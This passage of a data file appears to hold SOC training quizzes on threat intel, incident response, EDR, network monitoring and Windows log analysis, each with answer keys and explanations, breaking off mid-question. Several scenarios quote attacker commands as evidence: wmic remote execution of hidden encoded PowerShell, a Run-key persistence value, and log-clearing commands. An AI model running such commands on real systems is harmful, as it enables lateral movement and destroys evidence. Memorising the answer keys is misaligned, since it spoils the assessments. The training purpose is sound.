        scenario: "Investigation finds: adversary 'FIN8', capability 'Sardonic backdoor', infrastructure '198.51.100.50', victim 'retail point-of-sale'.",
        question: "These four facets map to which model, and what is its analytical value?",
        options: [
          "Cyber Kill Chain — they are kill-chain phases",
          "Diamond Model — the four vertices (Adversary, Capability, Infrastructure, Victim); pivoting along any edge expands the investigation (e.g., same capability seen at other victims)",
          "STRIDE — threat modeling",
          "OWASP Top 10"
        ],
        correctAnswer: 1,
        explanation: "Diamond Model is built for relational pivoting across the four facets. Each edge enables a hypothesis ('what other victims share this infrastructure?' 'what other capabilities does this adversary use?'). It pairs naturally with ATT&CK and the Kill Chain."
      },
      {
        id: "q5-3",
        difficulty: "medium",
        tags: ["TLP"],
        scenario: "A peer SOC shares a hot indicator marked TLP:AMBER+STRICT. A vendor sales rep asks you to share it for a webinar.",
        question: "What may you do?",
        options: [
          "Share it — vendors are trusted partners",
          "Post it to Twitter to warn the community",
          "Refuse; TLP:AMBER+STRICT restricts sharing to the recipient organization only — you cannot redistribute externally without explicit permission from the source",
          "Forward it but remove the source name"
        ],
        correctAnswer: 2,
        explanation: "TLP:AMBER = limited distribution within the recipient org and clients with need-to-know. The +STRICT modifier removes the 'clients' clause. Violating TLP destroys trust and intel-sharing relationships."
      },
      {
        id: "q5-4",
        difficulty: "hard",
        tags: ["Pivoting", "OSINT"],
        scenario: "You have one C2 domain: secure-update-cdn[.]net (registered 4 days ago, NameCheap, Cloudflare-fronted).",
        question: "Which pivot sequence yields the MOST analytical value?",
        options: [
          "Just block the domain",
          "Pivot: WHOIS registrant email -> other domains by same email/phone -> passive DNS for historical IPs -> certificate SANs (crt.sh) for sibling domains -> sample any hosted content via sandbox -> map findings to ATT&CK and check internal telemetry for hits on all discovered indicators",
          "Run Nmap against the IP",
          "Search Google for the domain name"
        ],
        correctAnswer: 1,
        explanation: "Single-indicator -> infrastructure cluster is the heart of CTI pivoting. WHOIS + passive DNS + cert transparency consistently reveal sibling infrastructure that the adversary is already using or about to use — letting you detect ahead, not behind."
      },
      {
        id: "q5-5",
        difficulty: "medium",
        tags: ["Strategic vs Tactical"],
        scenario: "Your CISO asks: 'Should we be worried about the new Volt Typhoon reporting?' She wants 1 page.",
        question: "Which CTI deliverable level is this?",
        options: [
          "Tactical — IOCs and hashes",
          "Operational — campaign-level TTPs",
          "Strategic — business risk, sector targeting, board-level implications and recommended posture changes",
          "Technical — malware reverse engineering"
        ],
        correctAnswer: 2,
        explanation: "CTI tiers: Strategic (executive, business risk), Operational (campaigns/TTPs for IR/hunt), Tactical (IOCs for detection/blocking), Technical (deep reverse engineering). Knowing the audience determines the output."
      },
      {
        id: "q5-6",
        difficulty: "hard",
        tags: ["IOC Confidence"],
        scenario: "Same IP 203.0.113.99 appears in:\n  - Internal: failed C2 sinkhole hit (1 hit, last week)\n  - Open-source feed: '1,200 confidence votes, malware C2'\n  - Commercial: 'shared hosting, mixed reputation'\n  - VirusTotal: 3/89 detections, all generic",
        question: "What is the correct decision?",
        options: [
          "Block immediately at perimeter — most sources flag it",
          "Ignore — VT score is low",
          "Alert (not block) and enrich: shared hosting + low VT + only 1 internal hit = high false-positive risk for blocking; collect more context before enforcement",
          "Add to threat report and forget"
        ],
        correctAnswer: 2,
        explanation: "Shared/CDN infrastructure + thin internal evidence + weak AV consensus = classic 'alert and enrich,' not 'block.' Confidence scoring across sources prevents self-inflicted outages — a recurring real-world CTI failure mode."
      }
    ]
  },
  {
    quizId: "q6",
    courseId: "soc-fundamentals",
    title: "Incident Response Decisions",
    description: "NIST IR lifecycle applied to live incidents — containment, eradication, recovery, lessons learned.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q6-1",
        difficulty: "medium",
        tags: ["Containment"],
        scenario: "EDR confirms ransomware actively encrypting files on a single workstation, WS-203. Network share \\\\fileserver\\finance is mounted from that host.",
        question: "What is the CORRECT first containment step?",
        options: [
          "Power off WS-203 (pull the plug) immediately",
          "Network-isolate WS-203 via EDR (preserves memory + running process for forensics) AND temporarily revoke the user's share permissions on \\\\fileserver\\finance",
          "Reimage WS-203",
          "Wait until you understand the variant"
        ],
        correctAnswer: 1,
        explanation: "Network isolation (EDR containment) stops lateral encryption and C2 while preserving volatile evidence — pulling power destroys memory artifacts (keys, injected code). Cutting the user's share rights protects the secondary blast radius."
      },
      {
        id: "q6-2",
        difficulty: "hard",
        tags: ["Evidence", "Chain of Custody"],
        scenario: "You suspect this incident may lead to litigation. You took a triage memory dump and ran several commands on the live host.",
        question: "What MUST you document for evidence to remain admissible?",
        options: [
          "Nothing — EDR logs everything",
          "Chain of custody: who collected/handled what, when, with which tool/version, hashes (SHA-256) of every artifact at collection, storage location, and every transfer signed/dated",
          "Just save the files",
          "Email the files to legal"
        ],
        correctAnswer: 1,
        explanation: "Admissibility hinges on demonstrable integrity (hashes at collection and at use) and an unbroken chain (every handler, every transfer). Without it, defense counsel will exclude the evidence — and your investigation collapses."
      },
      {
        id: "q6-3",
        difficulty: "medium",
        tags: ["NIST Lifecycle"],
        scenario: "After containment of a webshell on a public web server, you have removed the file, rotated credentials, and restored from backup. Tickets are closed.",
        question: "What essential NIST phase is being skipped?",
        options: [
          "Detection",
          "Containment",
          "Lessons Learned / Post-Incident: root-cause analysis (how did the webshell get there?), control gaps, detection improvements, and runbook updates — without this, the same incident recurs",
          "Preparation"
        ],
        correctAnswer: 2,
        explanation: "Skipping post-incident review is the most common immaturity in young IR programs. The webshell got there via an unpatched CVE or a misconfig; closing without RCA guarantees recurrence."
      },
      {
        id: "q6-4",
        difficulty: "hard",
        tags: ["Eradication"],
        scenario: "You eradicated malware on 3 hosts. A week later, the same malware re-appears on host #4 in the same subnet.",
        question: "What is the MOST likely root cause and the right fix?",
        options: [
          "Bad luck — repeat eradication",
          "Eradication was incomplete: missed persistence (scheduled task, service, WMI, AD scheduled object, or a compromised credential/shared script). Hunt across the environment for the original initial-access vector and persistence indicators BEFORE re-eradicating",
          "Antivirus signature outdated",
          "Vendor needs to be called"
        ],
        correctAnswer: 1,
        explanation: "Reinfection nearly always means root cause (initial access) or persistence was missed. Mature IR scopes the full footprint (all hosts, all persistence locations, all credentials touched) before declaring eradication."
      },
      {
        id: "q6-5",
        difficulty: "medium",
        tags: ["Communication"],
        scenario: "30 minutes into a major incident, the CEO walks into the SOC and asks 'is our customer data safe?'",
        question: "Best response?",
        options: [
          "'Yes, everything is fine'",
          "'We don't know yet — we are not ignoring you'",
          "'We have contained the affected host and are investigating scope. Current evidence does not show customer-database access; I will confirm or update you in 30 minutes.' (factual, scoped, time-bounded)",
          "Refuse to speak until investigation is complete"
        ],
        correctAnswer: 2,
        explanation: "Executive communications during incidents must be factual, scoped to what is known, and include a next-update commitment. Never speculate (false reassurance is reputational suicide); never stonewall (drives parallel un-coordinated action)."
      },
      {
        id: "q6-6",
        difficulty: "hard",
        tags: ["Recovery"],
        scenario: "You restored 12 production servers from backup. The business asks 'can we put them back online now?'",
        question: "Correct gating criteria before re-connection?",
        options: [
          "Yes — backups are clean by definition",
          "Only after: (1) backup verified pre-incident clean (date + integrity), (2) initial-access vector closed (patch/config), (3) credentials rotated, (4) heightened monitoring & detection deployed for known TTPs, (5) recovery validated in an isolated segment first",
          "Yes — but only at night",
          "Wait 30 days regardless"
        ],
        correctAnswer: 1,
        explanation: "Recovery without closing the root cause and adding heightened monitoring is how organizations get re-owned within days. The five-gate checklist is the IR-team minimum and the basis of every post-incident hardening report."
      }
    ]
  },
  {
    quizId: "q7",
    courseId: "soc-fundamentals",
    title: "EDR & Endpoint Investigation",
    description: "Process trees, behavioral detections, and endpoint forensics scenarios.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q7-1",
        difficulty: "medium",
        tags: ["Process Tree"],
        scenario: "EDR process tree:\n  services.exe -> svchost.exe -> rundll32.exe C:\\Users\\Public\\a.dll,Start -> cmd.exe -> whoami /all\n                                                                              -> net group \"Domain Admins\" /domain",
        question: "What is the most accurate interpretation?",
        options: [
          "Routine system activity",
          "Suspicious DLL side-loaded via rundll32 from a user-writable path, then performing host & domain reconnaissance (T1087.001/.002). Likely post-exploitation; isolate and investigate the DLL origin",
          "Antivirus scanning",
          "Patch installation"
        ],
        correctAnswer: 1,
        explanation: "rundll32 executing a DLL from C:\\Users\\Public, followed immediately by whoami + Domain Admin enumeration, is the post-exploitation signature of a hands-on-keyboard adversary or a discovery payload."
      },
      {
        id: "q7-2",
        difficulty: "hard",
        tags: ["Living Off the Land"],
        scenario: "You see `wmic process call create \"powershell -nop -w hidden -e <base64>\"` executed remotely by a domain account against 18 servers in 4 minutes.",
        question: "What is this and what is the priority action?",
        options: [
          "Authorized patching tool",
          "Lateral movement via WMI (T1047) with encoded payload — likely an active intrusion. Disable the compromised account, isolate target hosts, capture memory, and decode the payload offline",
          "Performance monitoring",
          "Backup job"
        ],
        correctAnswer: 1,
        explanation: "WMI remote process creation with hidden encoded PowerShell across many hosts in minutes is a hallmark lateral-movement pattern (Cobalt Strike `wmi`, Impacket `wmiexec`, manual `wmic`). Account containment first to halt the spread."
      },
      {
        id: "q7-3",
        difficulty: "medium",
        tags: ["EDR vs AV"],
        scenario: "Comparing two products on the same incident: legacy AV flagged nothing; EDR flagged 7 behaviors and built a process tree.",
        question: "Which statement best explains the difference?",
        options: [
          "EDR has better signatures",
          "AV is signature/hash-based and misses novel/fileless attacks; EDR records process, file, registry, and network telemetry, enabling behavioral detection, retrospective hunting, and response actions",
          "AV is more secure",
          "They are the same"
        ],
        correctAnswer: 1,
        explanation: "EDR's advantage is telemetry + behavioral analytics + response, not just 'better signatures.' This is also why EDR enables threat hunting and forensics whereas AV cannot."
      },
      {
        id: "q7-4",
        difficulty: "hard",
        tags: ["Forensics", "Volatile Data"],
        scenario: "Suspected fileless malware on a live host. You have 30 minutes before the user returns.",
        question: "What is the CORRECT collection order?",
        options: [
          "Disk image first, then memory",
          "Order of Volatility: 1) CPU/registers/cache state (rare), 2) RAM (memory dump), 3) Network connections + running processes, 4) Disk artifacts, 5) Archived logs. Memory FIRST because fileless lives only in RAM",
          "Reboot the host to clear suspicious processes",
          "Run AV scan first"
        ],
        correctAnswer: 1,
        explanation: "Order of Volatility (RFC 3227): most-volatile first. Fileless malware (reflective DLLs, in-memory PowerShell) leaves nothing on disk — losing RAM loses the case."
      },
      {
        id: "q7-5",
        difficulty: "medium",
        tags: ["Persistence"],
        scenario: "Autoruns / Sysmon EID 13 on workstation shows:\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> \"Updater\" = \"powershell -w hidden -enc ...\"",
        question: "What is this and what is the right action?",
        options: [
          "Legitimate update mechanism",
          "User-level Registry Run-key persistence (T1547.001) executing hidden encoded PowerShell. Capture the value, decode offline, remove the key, kill any running instance, and hunt the same pattern across the fleet",
          "Group Policy",
          "Windows feature"
        ],
        correctAnswer: 1,
        explanation: "HKCU Run-key is the most common Windows persistence — survives reboot, runs as the user, and is trivially deployable. Always decode the payload OFFLINE (sandbox/safe env), not by executing it on the host."
      },
      {
        id: "q7-6",
        difficulty: "hard",
        tags: ["Response Actions"],
        scenario: "EDR offers: kill process, quarantine file, isolate host, block hash globally, retrieve file, run script.",
        question: "An active beacon is detected on a JUMP server used by all admins. What sequence is BEST?",
        options: [
          "Block hash globally first, then investigate",
          "1) Isolate host (stops spread + preserves state), 2) Retrieve the beacon binary for analysis, 3) Capture memory, 4) Kill the process, 5) Quarantine file, 6) Globally block hash, 7) Hunt for hash + behavior fleet-wide",
          "Reboot the jump server",
          "Kill the process first to stop activity"
        ],
        correctAnswer: 1,
        explanation: "Isolate before kill — killing the process destroys the live state you need to analyze. Retrieve + capture memory while the host is contained but powered, then proceed to kill/quarantine and finally fleet-wide hunting. Jump-server compromise means EVERY admin credential touched recently should also be considered burned."
      }
    ]
  },
  {
    quizId: "q8",
    courseId: "soc-fundamentals",
    title: "Network Security Monitoring",
    description: "NSM scenarios — IDS/IPS, traffic analysis, encrypted-traffic visibility, and pivoting from network signals.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q8-1",
        difficulty: "medium",
        tags: ["IDS vs IPS"],
        scenario: "Your team must protect a critical OT (operational technology) plant network where false-positive blocks could halt production.",
        question: "What deployment is MOST appropriate?",
        options: [
          "IPS in-line, block everything by default",
          "IDS in monitoring (SPAN/TAP) mode for visibility + selective IPS only on high-confidence signatures on the IT/OT boundary; never inline within the OT plant",
          "Remove all network monitoring",
          "Use only host antivirus"
        ],
        correctAnswer: 1,
        explanation: "OT environments cannot tolerate false-positive blocks. The mature pattern is rich visibility (IDS/passive) inside the plant, with selective enforcement at the boundary. Knowing when NOT to block is part of the job."
      },
      {
        id: "q8-2",
        difficulty: "hard",
        tags: ["Encrypted Traffic"],
        scenario: "80% of your outbound traffic is TLS-encrypted. You cannot do TLS interception for privacy/regulatory reasons.",
        question: "Which signals STILL give you meaningful detection on encrypted C2?",
        options: [
          "None — you must decrypt",
          "JA3/JA3S (client/server TLS fingerprints), SNI, certificate fields (CN, SAN, issuer, validity, self-signed), DNS queries preceding the connection, destination reputation, beaconing periodicity, byte-volume asymmetry, and ASN/geo of destination",
          "Only NetFlow",
          "Only DNS"
        ],
        correctAnswer: 1,
        explanation: "Encrypted-traffic analytics is a deep field. TLS metadata (JA3 fingerprints, certs, SNI) + flow behavior (periodicity, asymmetry) + DNS + reputation can detect a remarkable amount without decryption — this is also how modern NDR products operate."
      },
      {
        id: "q8-3",
        difficulty: "medium",
        tags: ["Zeek/Suricata"],
        scenario: "Suricata fires ET POLICY 'self-signed certificate from internal host to external IP on 443.'",
        question: "Best interpretation?",
        options: [
          "Always benign — many sites use self-signed certs",
          "Suspicious-but-not-conclusive; pivot: process attribution on the source host, destination reputation, JA3 fingerprint match against C2 frameworks (Cobalt Strike default JA3 is well-known), DNS history, and beacon analysis",
          "Critical — block immediately",
          "False positive — disable rule"
        ],
        correctAnswer: 1,
        explanation: "Self-signed certs to external destinations are unusual and worth investigating but not conclusive. The pivots (host process, JA3 match, beacon timing) turn a weak signal into a strong verdict — a classic NSM workflow."
      },
      {
        id: "q8-4",
        difficulty: "hard",
        tags: ["DNS Analysis"],
        scenario: "Zeek dns.log: a host issues 4,200 TXT-record queries in 10 min to subdomains of *.api-telemetry[.]xyz with average label length 35 characters.",
        question: "What is the BEST hypothesis?",
        options: [
          "Legitimate DNS-based service discovery",
          "DNS tunneling / exfiltration (T1071.004 or T1048.003) — long random labels + high TXT volume to a single 2LD = classic tunnel signature; isolate host and pcap immediately",
          "DNSSEC validation",
          "Cache warmup"
        ],
        correctAnswer: 1,
        explanation: "Long, high-entropy labels + dominance of TXT records + tight time window + single 2LD = DNS tunneling. Common tools: iodine, dnscat2, Cobalt Strike DNS mode. Detection patterns: entropy, label length, query volume per 2LD."
      },
      {
        id: "q8-5",
        difficulty: "medium",
        tags: ["NetFlow", "Behavioral"],
        scenario: "NetFlow shows host A maintaining a single long-lived TCP connection (24h, ~50 packets/min, small) to a high-numbered port on a foreign IP. No legitimate business reason found.",
        question: "What detection name fits BEST?",
        options: [
          "DDoS attack",
          "Long-lived low-volume covert channel / interactive C2 — pivot to process attribution, destination reputation, and similar patterns elsewhere; capture pcap if still active",
          "Backup traffic",
          "Video streaming"
        ],
        correctAnswer: 1,
        explanation: "Persistent low-volume sessions are the signature of interactive shells (reverse SSH, custom C2). NetFlow alone is enough to spot them; pcap + EDR confirm."
      },
      {
        id: "q8-6",
        difficulty: "hard",
        tags: ["Lateral Movement"],
        scenario: "Internal east-west traffic spike: workstation 10.0.5.99 initiated 445/tcp (SMB) and 5985/tcp (WinRM) to 38 servers in 11 minutes, then 88/tcp (Kerberos) traffic patterns consistent with Kerberoasting requests.",
        question: "What is happening?",
        options: [
          "Inventory scan by IT",
          "Active lateral movement + credential attack: SMB/WinRM sweep (T1021.002/.006) and Kerberoasting (T1558.003). Disable account, isolate host, alert IR — this is intrusion-in-progress",
          "Backup software",
          "Group Policy refresh"
        ],
        correctAnswer: 1,
        explanation: "Burst SMB+WinRM fan-out plus Kerberos service-ticket requests for many SPNs is unmistakable Kerberoasting + LM. Speed matters — every minute is more compromised credentials."
      }
    ]
  },
  {
    quizId: "q9",
    courseId: "soc-fundamentals",
    title: "SOC Mastery: Hunting, Handover & Career",
    description: "Synthesis quiz covering proactive hunting, shift handover discipline, investigation rigor, and analyst growth.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q9-1",
        difficulty: "medium",
        tags: ["Hunting", "Hypothesis"],
        scenario: "Your hunt-team lead says 'go hunt for ransomware.'",
        question: "Which is the BEST hypothesis-driven hunt formulation?",
        options: [
          "Search for 'ransomware' across all logs",
          "Hypothesis: 'A ransomware operator has performed AD recon via BloodHound-like LDAP enumeration in the last 14 days.' Data: AD audit, Sysmon, EDR. Logic: spike in SAMR/LDAP enumeration per host vs. baseline. Validate, document, hand to detection eng if signal is real",
          "Run a vulnerability scan",
          "Block all SMB"
        ],
        correctAnswer: 1,
        explanation: "Threat hunting = a falsifiable hypothesis + a specific data source + a defined logic + an outcome (new detection, runbook, or 'no evidence'). 'Search for ransomware' is not a hunt."
      },
      {
        id: "q9-2",
        difficulty: "hard",
        tags: ["Hunting Maturity"],
        scenario: "Your SOC currently only reacts to alerts. Leadership wants to add hunting.",
        question: "Which maturity progression is correct?",
        options: [
          "Buy a hunt platform and hire 10 hunters",
          "1) Establish telemetry coverage gaps vs. ATT&CK, 2) Start with intel-driven hunts (known TTPs), 3) Add hypothesis-driven hunts, 4) Mature to analytics/ML-assisted hunts, 5) Feedback loop: every successful hunt becomes a detection",
          "Outsource everything",
          "Disable existing alerts"
        ],
        correctAnswer: 1,
        explanation: "Hunting maturity grows with telemetry, process, and feedback. Without ATT&CK coverage mapping you don't know what you can hunt; without the 'hunt -> detection' feedback loop you discover the same things forever."
      },
      {
        id: "q9-3",
        difficulty: "medium",
        tags: ["Handover"],
        scenario: "End of your night shift. Active items:\n  - IR-441 ransomware contained, awaiting forensic image\n  - INC-887 user reported phishing; analyzed, malicious, awaiting recall\n  - 12 informational alerts deferred",
        question: "What is the proper handover content?",
        options: [
          "'All good, see you tomorrow'",
          "For each open item: ticket ID, current state, next action with owner, blockers, decisions made (with rationale), and ETA. Plus environment-wide notes (e.g., 'elevated phishing volume from .ru domains tonight')",
          "Just forward the ticket links",
          "Verbal only; no notes"
        ],
        correctAnswer: 1,
        explanation: "Structured handover (state + next action + owner + decisions) prevents the most common SOC failure mode: dropped incidents at shift change. Environmental context primes the incoming shift for what to expect."
      },
      {
        id: "q9-4",
        difficulty: "hard",
        tags: ["Investigation Rigor"],
        scenario: "An analyst closes a ticket as 'False Positive — looks like normal admin activity.' No evidence captured, no pivots done.",
        question: "What is wrong with this closure?",
        options: [
          "Nothing — analyst judgment is enough",
          "No evidentiary basis is documented. Proper closure requires the evidence trail (who/what/when), the pivots performed (host process, account history, peer baseline), and the explicit reason it is benign. Otherwise it is unverifiable and may hide a real compromise",
          "Should have escalated regardless",
          "Should have called the user"
        ],
        correctAnswer: 1,
        explanation: "'Looks normal' is not a verdict. Documented closures are auditable, allow other analysts to learn, and protect the SOC if the case re-emerges. Quality bar: a stranger should be able to reproduce your verdict from the ticket alone."
      },
      {
        id: "q9-5",
        difficulty: "medium",
        tags: ["Bias", "Cognitive"],
        scenario: "An analyst sees a familiar-looking PowerShell command line, recognizes it as 'last week's IT script,' closes the alert. It turns out to be a similar-but-malicious variant.",
        question: "Which cognitive bias drove the error?",
        options: [
          "Anchoring",
          "Recognition / availability bias — prior familiarity over-rode actual verification of the current artifact (hash, signature, parent, full command line)",
          "Sunk-cost fallacy",
          "Confirmation bias only"
        ],
        correctAnswer: 1,
        explanation: "Recognition bias is the SOC's silent killer. Defense: forced verification checklists ('compare hash, full command line, parent process, signature') prevent pattern-matching from substituting for evidence."
      },
      {
        id: "q9-6",
        difficulty: "medium",
        tags: ["Career", "Growth"],
        scenario: "A Tier 1 analyst wants to grow into detection engineering within 12 months.",
        question: "Which growth plan is MOST realistic and impactful?",
        options: [
          "Watch random YouTube videos",
          "Build a home lab (Splunk/ELK + Sysmon + adversary emulation with Atomic Red Team / Caldera), contribute detections to Sigma, write 1 internal detection per month with metrics, study ATT&CK + the SOC's data sources, and shadow a senior on tuning",
          "Apply for a manager role",
          "Wait for the company to train them"
        ],
        correctAnswer: 1,
        explanation: "Detection engineering is a craft — lab reps + open-source contributions + measurable internal output + ATT&CK fluency + mentorship is the proven path. Passive learning rarely makes the jump."
      },
      {
        id: "q9-7",
        difficulty: "easy",
        tags: ["Wellbeing"],
        scenario: "You have worked a 12-hour shift with a major incident. Your replacement is 20 minutes late and you are exhausted.",
        question: "Best decision?",
        options: [
          "Push through and keep handling alerts alone",
          "Inform the duty manager, document the gap, hand over to whoever is on-call per policy, and log off; tired analysts make mistakes that cost more than a delayed handover",
          "Falsify the handover",
          "Stay silent until replacement arrives"
        ],
        correctAnswer: 1,
        explanation: "Fatigue is a security control failure. Healthy SOCs have explicit escalation paths for late handovers. Burnout-driven errors are the most expensive bugs in the SOC."
      }
    ]
  },
  // Log Analysis Course Quizzes — scenario-based upgrade
  {
    quizId: "la-q1",
    courseId: "log-analysis",
    title: "Log Fundamentals: Formats, Sources & Triage Mindset",
    description: "Scenario-based assessment on log formats, timestamps, normalization, and the analyst mindset for raw log triage.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
        {
          id: "la-q1-1",
          difficulty: "easy",
          tags: ["Log Formats", "Parsing"],
          scenario: "Three log shippers feed your SIEM. Sample lines below — same login event, three formats:\n  A) 2026-06-15T08:14:22Z user=jdoe src=10.1.4.55 action=login status=success\n  B) {\"ts\":\"2026-06-15T08:14:22Z\",\"user\":\"jdoe\",\"src\":\"10.1.4.55\",\"action\":\"login\",\"status\":\"success\"}\n  C) Jun 15 08:14:22 host01 sshd[2231]: Accepted password for jdoe from 10.1.4.55 port 51422 ssh2",
          question: "You need to parse all three reliably into the same schema. Which is true?",
          options: [
            "A is JSON, B is KV, C is CEF — all are equally easy to parse.",
            "B (JSON) is the most parser-friendly and self-describing; A (KV) needs a key=value extractor; C (syslog free-text) requires a regex/grok pattern.",
            "C should be preferred because it is human-readable and never breaks.",
            "All three should be stored as raw blobs without parsing to save CPU.",
          ],
          correctAnswer: 1,
          explanation: "B is structured JSON — parsers handle nested fields natively. A is KV (key=value), easy but flat. C is classic free-text syslog where field positions vary by daemon — grok/regex is needed and breaks when the vendor changes the format. Storing raw blobs (D) destroys search performance."
        },
        {
          id: "la-q1-2",
          difficulty: "easy",
          tags: ["Timestamps", "Correlation"],
          scenario: "Two systems log the same SSH login:\n  Firewall: 2026-06-15 08:14:22 +0000\n  Linux host: Jun 15 03:14:21 EST",
          question: "Why is this a problem for correlation, and what is the FIRST thing to fix?",
          options: [
            "No problem — the events are obviously the same.",
            "Enforce a single time standard (UTC) and ISO 8601 on every source; NTP-sync all hosts before tuning correlation rules.",
            "Adjust the SIEM rule to accept a 6-hour window so anything matches.",
            "Drop the Linux log because it uses a legacy format.",
          ],
          correctAnswer: 1,
          explanation: "Mixed time zones + non-ISO formats are the #1 cause of broken timeline reconstruction. Standardize on UTC ISO-8601 and NTP — widening the window (C) just hides drift and creates false correlations."
        },
        {
          id: "la-q1-3",
          difficulty: "medium",
          tags: ["Log Levels", "Noise"],
          scenario: "Your app emits ~4M DEBUG lines/day. Storage cost is exploding and analysts ignore the index. The dev team insists DEBUG must stay 'for troubleshooting'.",
          question: "What is the right SOC-side action?",
          options: [
            "Forward everything to the hot SIEM tier — storage is cheap.",
            "Drop DEBUG at the forwarder, send WARNING+ to the hot tier, and route INFO/DEBUG to cheap cold storage with a 7-day retention for dev access.",
            "Disable application logging entirely.",
            "Keep DEBUG but mute all alerts.",
          ],
          correctAnswer: 1,
          explanation: "Tiered retention is the standard answer: hot tier for security-relevant levels (WARNING/ERROR/CRITICAL + auth/audit), cold tier for verbose dev logs. This preserves the dev workflow without bankrupting the SIEM license."
        },
        {
          id: "la-q1-4",
          difficulty: "medium",
          tags: ["Normalization", "CIM"],
          scenario: "Three sources call the same field different names:\n  Palo Alto: src\n  Cisco ASA: SourceIP\n  Windows: IpAddress",
          question: "What concept lets you write ONE detection that matches all three?",
          options: [
            "Log rotation",
            "Field normalization to a common schema (e.g. Splunk CIM, Elastic ECS) — every source maps its native field to src_ip at ingest.",
            "Storing logs in CSV",
            "Encrypting logs in transit",
          ],
          correctAnswer: 1,
          explanation: "Field normalization (CIM / ECS / OCSF) is the foundation of multi-source detection. Without it every rule needs N OR-clauses and breaks the day a new product is added."
        },
        {
          id: "la-q1-5",
          difficulty: "medium",
          tags: ["Log Sources", "Coverage"],
          scenario: "Management asks: 'We have firewall logs — isn't that enough?' You map current coverage:\n  ✅ Perimeter firewall\n  ❌ Endpoint (no EDR/Sysmon)\n  ❌ Identity (no AD audit)\n  ❌ DNS\n  ❌ Cloud audit (AWS CloudTrail)",
          question: "Which gap most directly blinds you to a successful phishing → credential theft → lateral movement chain?",
          options: [
            "Firewall is fine on its own.",
            "Endpoint + identity logs — phishing payload execution and credential abuse happen on the host and in AD; the firewall sees only the C2 egress at best.",
            "Cloud audit logs — they would catch the phishing email.",
            "DNS logs are the only thing that matters.",
          ],
          correctAnswer: 1,
          explanation: "Perimeter alone misses everything that happens AFTER initial access. Endpoint (process/file/network) and identity (4624/4625/4768/4769) telemetry are the bare-minimum additions to detect post-exploitation."
        },
        {
          id: "la-q1-6",
          difficulty: "easy",
          tags: ["Log Integrity", "Forensics"],
          scenario: "Mid-incident, a senior dev offers to 'clean up' a noisy production log file on the compromised host before forensics arrives.",
          question: "Correct response?",
          options: [
            "Let them — DEBUG lines are noise anyway.",
            "Refuse and preserve. Logs on a compromised host are evidence; hash them, copy to write-once storage, and maintain chain of custody.",
            "Delete the file yourself to keep it simple.",
            "Email the file to yourself and then delete the original.",
          ],
          correctAnswer: 1,
          explanation: "Once an incident is declared, on-host logs are evidence. Hash (SHA-256), copy to WORM/immutable storage, and document chain of custody. Modifying or deleting is potential spoliation."
        },
        {
          id: "la-q1-7",
          difficulty: "medium",
          tags: ["Centralization", "Architecture"],
          question: "Why is shipping logs OFF the endpoint (to a central SIEM/syslog server) a security control, not just an operational one?",
          options: [
            "It makes logs prettier.",
            "An attacker with local admin can clear/modify local logs (e.g. wevtutil cl, > /var/log/auth.log) — central copies survive because the attacker has no privileges on the SIEM.",
            "It reduces CPU on the SIEM.",
            "Central logs are required by HTTPS.",
          ],
          correctAnswer: 1,
          explanation: "Log centralization defeats anti-forensics: T1070.001 (Clear Windows Event Logs) and T1070.002 (Clear Linux/Mac Logs) only erase the local copy. The shipped copy is your source of truth."
        },
        {
          id: "la-q1-8",
          difficulty: "medium",
          tags: ["Retention", "Compliance"],
          scenario: "Your CISO asks 'what's the minimum log retention we need?' You have PCI-DSS scope (cardholder data) and a typical breach dwell time of 200+ days.",
          question: "Best answer?",
          options: [
            "30 days — that's what the firewall vendor defaults to.",
            "At least 1 year total with the most recent 3 months immediately searchable; PCI-DSS requires ≥1 year retention with ≥3 months online, and dwell-time data shows shorter windows miss the initial compromise.",
            "7 days — anything older is irrelevant.",
            "Indefinite retention of every log on hot storage.",
          ],
          correctAnswer: 1,
          explanation: "PCI-DSS req. 10.5.1 — ≥1 year retention, ≥3 months immediately available. Mandiant/IBM dwell-time data (~200d median) means shorter windows literally cannot reach the initial intrusion. Indefinite hot storage (D) is wasteful — use cold/cheap tiers for older data."
        },
        {
          id: "la-q1-9",
          difficulty: "hard",
          tags: ["Parsing", "Detection Quality"],
          scenario: "A new SaaS app sends logs as:\n  2026-06-15 08:14:22 LOGIN user=\"jdoe\" result=\"OK\" geo=\"IN-Bengaluru\" device=\"mac/Chrome\"\nThe SIEM ingests them as a single unparsed message field. The 'failed logins' dashboard shows ZERO events for this app despite obvious failures.",
          question: "Root cause and fix?",
          options: [
            "The SIEM is broken — open a P1 with the vendor.",
            "The source is ingested but not parsed — without field extraction, dashboards that filter on result=FAIL never match. Write a parser (props.conf / ingest pipeline / grok) to extract user, result, geo, device.",
            "The app is not generating failures.",
            "Failed-login dashboards do not work on SaaS logs.",
          ],
          correctAnswer: 1,
          explanation: "Classic 'ingested but invisible' problem. Without field extraction, the message is one big string and structured filters miss. Build the parser/ingest pipeline, then backfill or wait for new events to populate the dashboard."
        },
        {
          id: "la-q1-10",
          difficulty: "hard",
          tags: ["Triage Mindset", "Pivoting"],
          scenario: "You see a single suspicious line in the proxy log: a workstation contacting hxxp://185.234.x.x/update.bin at 03:11 local. You have 10 minutes before standup.",
          question: "Which pivot order produces the most signal fastest?",
          options: [
            "Block the IP at the firewall, close the alert, move on.",
            "Pivot: (1) DNS log for what resolved that IP, (2) EDR for the process that initiated the connection, (3) auth log for who was on the host at 03:11, (4) proxy for other hosts hitting the same IP — THEN decide on containment.",
            "Email the user and ask if they downloaded anything.",
            "Restart the workstation to clear any malware.",
          ],
          correctAnswer: 1,
          explanation: "Containment without investigation (A) destroys context and tells the attacker they're caught. The pivot order — network → process → user → blast-radius — is the standard Tier 1/2 enrichment chain before any block/isolate decision."
        },
    ]
  },
  {
    quizId: "la-q2",
    courseId: "log-analysis",
    title: "Windows Event Log Investigation",
    description: "Hands-on triage of Security, System, and Sysmon events — logon types, process creation, persistence, and lateral movement.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
        {
          id: "la-q2-1",
          difficulty: "easy",
          tags: ["EID 4624", "Logon Types"],
          scenario: "Security log on FIN-WS-12:\n  EventID=4624  Account=jdoe  LogonType=3  SourceNetworkAddress=10.4.2.55  AuthPackage=NTLM  Time=02:47\nUser jdoe is in IT, normally logs in at 09:00 via interactive console.",
          question: "What is the most accurate interpretation?",
          options: [
